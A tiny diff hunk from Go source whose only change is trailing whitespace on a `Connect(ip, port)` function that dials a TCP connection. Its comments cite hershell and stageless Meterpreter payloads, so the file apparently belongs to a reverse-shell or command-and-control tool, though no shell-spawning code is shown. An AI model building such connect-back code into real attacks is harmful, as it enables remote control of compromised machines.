@@ -16,7 +16,7 @@ import (
 //	- https://github.com/lesnuages/hershell
 //  - https://buffered.io/posts/staged-vs-stageless-handlers/
 //	- https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/
-func Connect(ip string, port string) (bool, error) {
+func Connect(ip string, port string) (bool, error) {	
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
 	if err != nil {
 		return false, err
